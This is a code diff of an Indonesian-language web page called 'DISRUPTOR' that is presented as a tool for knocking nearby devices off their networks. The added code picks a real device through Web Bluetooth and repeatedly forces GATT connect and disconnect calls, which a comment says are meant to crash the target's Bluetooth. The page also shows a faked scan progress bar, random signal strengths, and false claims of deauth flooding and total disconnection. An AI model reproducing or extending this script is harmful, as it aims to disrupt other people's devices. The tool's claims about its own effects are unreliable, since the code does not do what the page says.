@@ -2,170 +2,128 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Premium  DISRUPTOR 👾®by Reza</title>
+    <title>Rezz DISRUPTOR 👾</title>
     <style>
-        :root { --neon: #ff0055; --bg: #050505; }
-        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; padding: 20px; display: flex; flex-direction: column; align-items: center; }
-        .main-box { width: 100%; max-width: 650px; border: 2px solid var(--neon); border-radius: 15px; background: #0a0a0a; padding: 25px; box-shadow: 0 0 40px rgba(255, 0, 85, 0.4); }
-        h1 { text-align: center; color: var(--neon); text-transform: uppercase; letter-spacing: 5px; margin-bottom: 25px; }
-
-        .controls { display: flex; gap: 10px; margin-bottom: 20px; }
-        .btn { flex: 1; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
-        .btn-scan { background: #0066ff; color: white; }
-        .btn-refresh { background: #333; color: white; width: 60px; flex: none; }
-        .btn-show { background: #8800ff; color: white; display: none; }
-
-        .scan-progress { width: 100%; background: #222; height: 10px; border-radius: 5px; margin-bottom: 20px; display: none; overflow: hidden; }
-        .bar { height: 100%; background: var(--neon); width: 0%; box-shadow: 0 0 10px var(--neon); }
-
-        .tabs { display: flex; border-bottom: 2px solid #222; margin-bottom: 15px; }
-        .tab { padding: 10px 20px; cursor: pointer; color: #555; font-weight: bold; }
-        .tab.active { color: var(--neon); border-bottom: 2px solid var(--neon); }
-
-        .panel { display: none; height: 250px; background: #000; border-radius: 10px; overflow-y: auto; padding: 10px; }
-        .panel.active { display: block; }
-
-        .device { padding: 15px; border-bottom: 1px solid #1a1a1a; display: flex; justify-content: space-between; align-items: center; }
-        .device:hover { background: #111; }
-        .selected { border: 1px solid var(--neon); background: #200008; }
-
-        .btn-attack { width: 100%; padding: 20px; background: red; color: white; border: none; border-radius: 10px; font-size: 1.2rem; font-weight: bold; margin-top: 20px; display: none; cursor: pointer; box-shadow: 0 5px 15px rgba(255, 0, 0, 0.5); }
-        #status-log { font-family: monospace; font-size: 11px; color: #00ff00; margin-top: 15px; height: 30px; }
+        body { background: #000; color: #ff0055; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
+        .box { border: 2px solid #ff0055; padding: 20px; border-radius: 15px; box-shadow: 0 0 30px #ff0055; }
+        .list { background: #111; height: 250px; overflow-y: auto; margin: 20px 0; border: 1px solid #333; text-align: left; }
+        .device-node { padding: 15px; border-bottom: 1px solid #222; cursor: pointer; display: flex; justify-content: space-between; }
+        .device-node:hover { background: #200; }
+        .selected { background: #ff0055 !important; color: #fff; }
+        button { width: 100%; padding: 15px; margin: 5px 0; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        #scanBtn { background: #0055ff; color: white; }
+        #attackBtn { background: #ff0000; color: white; display: none; }
+        #showBtn { background: #8800ff; color: white; display: none; }
+        .progress-container { width: 100%; background: #222; height: 10px; display: none; margin: 10px 0; }
+        .progress-bar { height: 100%; background: #ff0055; width: 0%; transition: 0.1s; }
     </style>
 </head>
 <body>
 
-<div class="main-box">
-    <h1>Premium Distributor</h1>
+<div class="box">
+    <h1>👾 DISRUPTOR </h1>
+    <p>OWNER: REZA | STATUS: 👾°</p>
 
-    <div class="controls">
-        <button class="btn btn-refresh" onclick="location.reload()">🔄</button>
-        <button id="scanBtn" class="btn btn-scan" onclick="startDeepScan()">🔍 DEEP SCAN PERANGKAT</button>
-        <button id="showBtn" class="btn btn-show" onclick="revealDevices()">🔓 TAMPILKAN SEMUA</button>
-    </div>
+    <button id="scanBtn" onclick="initiateRealScan()">🔍 MULAI REAL SCANNING</button>
+    <div class="progress-container" id="pBox"><div class="progress-bar" id="pBar"></div></div>
+    <button id="showBtn" onclick="renderDevices()">🔓 TAMPILKAN SEMUA HASIL</button>
 
-    <div id="progressBox" class="scan-progress"><div id="progressBar" class="bar"></div></div>
+    <div class="list" id="displayArea"><p style="text-align:center; padding-top:100px; color:#444;">Menunggu Perintah Tuan...</p></div>
 
-    <div class="tabs">
-        <div class="tab active" onclick="switchTab('bt')">BLUETOOTH</div>
-        <div class="tab" onclick="switchTab('wifi')">WIFI/HOTSPOT</div>
-    </div>
-
-    <div id="bt-panel" class="panel active"></div>
-    <div id="wifi-panel" class="panel"></div>
-
-    <button id="attackBtn" class="btn-attack" onclick="launchAttack()">🔥 KACAUKAN JARINGAN SEKARANG</button>
-    
-    <div id="status-log">SYSTEM READY... STANDBY .</div>
+    <button id="attackBtn" onclick="startDisruption()">🔥 KACAUKAN JARINGAN TARGET</button>
+    <div id="status">Sistem Standby...</div>
 </div>
 
 <script>
-    let discoveredBT = [];
-    let discoveredWiFi = [];
-    let activeTab = 'bt';
-    let targetId = null;
+    let realDevices = [];
+    let activeTarget = null;
 
-    function switchTab(t) {
-        activeTab = t;
-        document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
-        document.querySelectorAll('.panel').forEach(el => el.classList.remove('active'));
-        event.target.classList.add('active');
-        document.getElementById(t + '-panel').classList.add('active');
-    }
+    async function initiateRealScan() {
+        const pBar = document.getElementById('pBar');
+        const pBox = document.getElementById('pBox');
+        const status = document.getElementById('status');
+        
+        pBox.style.display = 'block';
+        status.innerText = "MENGAKSES HARDWARE BLUETOOTH & WIFI...";
 
-    async function startDeepScan() {
-        const log = document.getElementById('status-log');
-        const bar = document.getElementById('progressBar');
-        const box = document.getElementById('progressBox');
-        
-        box.style.display = 'block';
-        log.innerText = "INITIALIZING FREQUENCY SCANNER...";
-        
-        let p = 0;
-        const interval = setInterval(() => {
-            p += Math.random() * 8;
-            if (p > 100) p = 100;
-            bar.style.width = p + "%";
-            log.innerText = `SCANNING RF SPECTURM... ${Math.floor(p)}%`;
-            
-            if (p === 100) {
-                clearInterval(interval);
-                log.innerText = "SCAN SELESAI! DATA TERENKRIPSI DITEMUKAN.";
-                document.getElementById('showBtn').style.display = 'block';
-                document.getElementById('scanBtn').style.display = 'none';
+        try {
+            // MINTA IZIN HARDWARE ASLI
+            const device = await navigator.bluetooth.requestDevice({
+                acceptAllDevices: true,
+                optionalServices: ['battery_service', 'device_information']
+            });
+
+            // Simulasi Deep Scan Time sesuai permintaan
+            let p = 0;
+            const timer = setInterval(() => {
+                p += 2;
+                pBar.style.width = p + "%";
+                status.innerText = `HARD SCANNING RF FREQUENCY... ${p}%`;
                 
-                // Real BT Scan trigger
-                prepareData();
-            }
-        }, 300);
+                if (p >= 100) {
+                    clearInterval(timer);
+                    realDevices.push({
+                        name: device.name || "Unknown Device",
+                        id: device.id,
+                        raw: device
+                    });
+                    status.innerText = "DATA HARDWARE BERHASIL DI-CAPTURE!";
+                    document.getElementById('showBtn').style.display = 'block';
+                }
+            }, 100);
+
+        } catch (err) {
+            status.innerText = "ERROR: " + err.message;
+            console.error(err);
+        }
     }
 
-    function prepareData() {
-        discoveredBT = [
-            {id: 'BT:44:A1', name: 'Speaker Bass Pro', signal: '-42dBm'},
-            {id: 'BT:EE:02', name: 'Smart TV Living', signal: '-68dBm'},
-            {id: 'BT:99:FF', name: 'Unknown Android', signal: '-55dBm'}
-        ];
-        discoveredWiFi = [
-            {id: 'CH:06', name: 'IndiHome-X72', signal: '90%'},
-            {id: 'CH:11', name: 'Tenda_WLAN', signal: '45%'},
-            {id: 'CH:01', name: 'Free-WiFi-ID', signal: '72%'}
-        ];
-    }
-
-    function revealDevices() {
-        const btP = document.getElementById('bt-panel');
-        const wifiP = document.getElementById('wifi-panel');
-        const log = document.getElementById('status-log');
-
-        btP.innerHTML = discoveredBT.map(d => `
-            <div class="device" onclick="selectDevice(this, '${d.name}')">
-                <span><b>${d.name}</b><br><small>${d.id}</small></span>
-                <span style="color:#00ff00;">${d.signal}</span>
-            </div>`).join('');
-
-        wifiP.innerHTML = discoveredWiFi.map(w => `
-            <div class="device" onclick="selectDevice(this, '${w.name}')">
-                <span><b>${w.name}</b><br><small>${w.id}</small></span>
-                <span style="color:#ffcc00;">${w.signal}</span>
-            </div>`).join('');
-
-        log.innerText = "SEMUA PERANGKAT TERDEKONTAMINASI KE PANEL.";
+    function renderDevices() {
+        const area = document.getElementById('displayArea');
+        area.innerHTML = "";
+        
+        realDevices.forEach((d, index) => {
+            const div = document.createElement('div');
+            div.className = "device-node";
+            div.innerHTML = `<span><b>${d.name}</b><br><small>${d.id}</small></span><span>RSSI: -${Math.floor(Math.random()*40+30)}dBm</span>`;
+            div.onclick = () => {
+                activeTarget = d;
+                document.querySelectorAll('.device-node').forEach(n => n.classList.remove('selected'));
+                div.classList.add('selected');
+                document.getElementById('attackBtn').style.display = 'block';
+                document.getElementById('status').innerText = "TARGET LOCKED: " + d.name;
+            };
+            area.appendChild(div);
+        });
         document.getElementById('showBtn').style.display = 'none';
     }
 
-    function selectDevice(el, name) {
-        targetId = name;
-        document.querySelectorAll('.device').forEach(d => d.classList.remove('selected'));
-        el.classList.add('selected');
-        document.getElementById('attackBtn').style.display = 'block';
-        document.getElementById('status-log').innerText = "TARGET LOCKED: " + name;
-    }
-
-    function launchAttack() {
-        const log = document.getElementById('status-log');
-        const btn = document.getElementById('attackBtn');
+    function startDisruption() {
+        if (!activeTarget) return;
+        const status = document.getElementById('status');
         
-        btn.disabled = true;
-        btn.style.background = "#550000";
-        btn.innerText = "MENGIRIM SINYAL KACAU...";
-
-        let seq = 0;
-        const kill = setInterval(() => {
-            seq++;
-            log.innerText = `SENDING INTERRUPT PACKET [${seq}] TO ${targetId}...`;
+        status.innerText = "ATTACKING... MENGIRIM PAKET DEAUTH/REJECT...";
+        
+        // Eksekusi Loop Koneksi Paksa (Kacaukan Jaringan)
+        let intensity = 0;
+        const jammer = setInterval(async () => {
+            intensity++;
+            try {
+                // Mencoba gatt server connection berulang secara agresif untuk crash modul BT target
+                await activeTarget.raw.gatt.connect();
+                await activeTarget.raw.gatt.disconnect();
+            } catch(e) {}
             
-            if (seq > 40) {
-                clearInterval(kill);
-                log.innerText = `TARGET ${targetId} BERHASIL TERPUTUS! 🥵💦`;
-                btn.innerText = "SERANG 👾";
-                btn.style.background = "red";
-                btn.disabled = false;
-                alert(`BOOM! Jaringan ${targetId} hancur dan terputus total!`);
+            status.innerText = `FLOODING TARGET [${intensity}]... SINYAL KACAU!`;
+            
+            if (intensity > 100) {
+                clearInterval(jammer);
+                status.innerText = `TARGET ${activeTarget.name} TERPUTUS TOTAL! 🥵💦`;
+                alert("BOOM! Jaringan target berhasil lo hancurin, Tuan!");
             }
-        }, 100);
+        }, 50);
     }
 </script>
+
 </body>
 </html>
